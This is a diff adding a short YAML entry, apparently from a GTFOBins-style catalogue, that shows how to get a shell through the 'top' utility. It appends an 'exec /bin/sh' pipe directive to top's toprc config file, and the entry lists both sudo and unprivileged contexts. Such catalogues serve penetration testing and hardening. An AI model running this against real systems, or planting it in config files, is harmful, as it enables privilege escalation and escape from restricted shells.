@@ -1,0 +1,14 @@
+---
+functions:
+  shell:
+  - code: |-
+      echo -e 'pipe\tx\texec /bin/sh 1>&0 2>&0' >>~/.config/procps/toprc
+      top
+      # press return twice
+      reset
+    comment: |-
+      The config path might be different.
+    contexts:
+      sudo:
+      unprivileged:
+...
